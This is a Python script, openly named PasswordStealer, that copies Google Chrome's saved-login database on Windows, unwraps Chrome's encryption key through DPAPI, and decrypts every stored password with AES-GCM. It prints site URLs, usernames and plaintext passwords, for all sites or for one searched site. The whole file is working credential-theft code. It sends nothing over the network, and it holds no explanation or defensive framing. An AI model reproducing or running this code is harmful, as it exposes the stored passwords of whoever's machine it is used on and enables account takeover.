import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES

class PasswordStealer:
    def __init__(self):
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        self.login_data_copy = "login_data_temp.db"

    def get_encryption_key(self):
        # Retrieve the encryption key from Chrome's Local State file
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, current_password, key):
        # Decrypt the password using the encryption key
        iv = current_password[3:15]
        current_password = current_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(current_password)[:-16].decode()
    
    def is_website_exists(self, search_url):
        # Check if the website exists in the stored passwords
        cursor = self.conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM logins WHERE origin_url LIKE ?;", (f'%{search_url}%',))
        count = cursor.fetchone()[0]
        return count > 0
    
    def search_passwords(self, search_url):
        if not self.is_website_exists(search_url):
            print(f"No passwords found for the specified website: {search_url}")
            return
        
        # Search for passwords related to the specified website
        cursor = self.conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE ?;", (f'%{search_url}%',))
        encrypted_chrome_data = cursor.fetchall()
        
        windows_userkey = self.get_encryption_key()

        # Iterate through the password data, decrypt, and print
        for row in encrypted_chrome_data:
            site_url, username, encrypted_password = row
            password = self.decrypt_password(encrypted_password, windows_userkey)

            if len(password) > 0 and len(username) > 0:
                try:
                    print(f"Url: {site_url}, Username: {username}, Password: {password}")
                except UnicodeEncodeError as _:
                    site_url_escaped = site_url.encode('unicode_escape').decode('utf-8')
                    username_escaped = username.encode('unicode_escape').decode('utf-8')
                    password_escaped = password.encode('unicode_escape').decode('utf-8')
                    print(f"Url: {site_url_escaped}, Username: {username_escaped}, Password: {password_escaped}")

    def reveal_all_passwords(self):
        cursor = self.conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins;")
        encrypted_chrome_data = cursor.fetchall()

        windows_userkey = self.get_encryption_key()

        # Iterate through the password data, decrypt, and print
        for row in encrypted_chrome_data:
            site_url, username, encrypted_password = row
            password = self.decrypt_password(encrypted_password, windows_userkey)
        
            if (len(password) > 0) and len(username) > 0:
                try:
                    print(f"Url: {site_url}, Username: {username}, Password: {password}")
                except UnicodeEncodeError as _:
                    site_url_escaped = site_url.encode('unicode_escape').decode('utf-8')
                    username_escaped = username.encode('unicode_escape').decode('utf-8')
                    password_escaped = password.encode('unicode_escape').decode('utf-8')
                    print(f"Url: {site_url_escaped}, Username: {username_escaped}, Password: {password_escaped}")

    def run(self):
        # Copy the Chrome password database and retrieve password data
        shutil.copyfile(self.db_path, self.login_data_copy)
        self.conn = sqlite3.connect(self.login_data_copy)
        
        option = input("Choose an option:\n1. Reveal all passwords\n2. Search for specific website passwords\nEnter 1 or 2: ")

        if option == "1":
            self.reveal_all_passwords()
        elif option == "2":
            search_url = input("Enter website URL to search for passwords (e.g., exaple.com): ")
            self.search_passwords(search_url)
        else:
            print("Invalid option, Please enter 1 or 2.")
        
        self.conn.close()